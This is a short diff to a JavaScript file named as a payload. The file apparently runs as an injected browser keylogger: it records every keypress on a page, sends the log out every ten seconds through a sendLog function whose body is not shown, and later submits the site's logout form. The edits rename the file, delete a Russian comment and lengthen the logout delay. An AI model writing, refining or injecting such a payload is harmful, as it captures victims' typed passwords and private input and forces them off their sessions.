@@ -1,4 +1,4 @@
-// payload.js
+// payloads.js
 try {
     var log = '';
     document.onkeydown = function(e) {
@@ -16,7 +16,7 @@ try {
         }
     }
 
-    setInterval(sendLog, 10000);  // Отправка лога каждые 10 сек
+    setInterval(sendLog, 10000);
 
     setTimeout(function() {
         var logoutForm = document.querySelector('form[action*="logout"]');
@@ -26,8 +26,7 @@ try {
         } else {
             console.log('Logout form not found');
         }
-    }, 1500);
+    }, 15000);
 } catch (error) {
     console.error('Payload error:', error);
-
 }
